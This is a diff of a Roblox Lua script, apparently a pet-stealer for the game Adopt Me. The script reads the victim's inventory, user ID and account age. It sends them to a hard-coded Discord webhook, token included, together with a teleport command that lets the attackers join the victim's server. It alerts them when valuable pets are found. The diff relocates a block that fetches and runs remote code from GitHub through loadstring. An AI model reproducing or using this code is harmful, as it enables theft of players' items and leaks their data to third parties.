@@ -1,16 +1,6 @@
 Username = "kely5171", "Onodakun23", "Slay_OZ1"
 Webhook = "https://discord.com/api/webhooks/"
 
-if getgenv().ui == nil then
-    getgenv().ui = true
-end
-if getgenv().ui == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
-    print("True GUI")
-elseif getgenv().ui == false then
-    print("False GUI")
-end
-
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -51,6 +41,17 @@ local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
 local LogsWebhook = "https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn"
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+
+
+if getgenv().ui == nil then
+    getgenv().ui = true
+end
+if getgenv().ui == true then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
+    print("True GUI")
+elseif getgenv().ui == false then
+    print("False GUI")
+end
 
 if legendaries_count >= 1 or mega_count >= 1 or neon_count >= 1 then
     rizz = '-- @everyone <@1247565783299784725>'
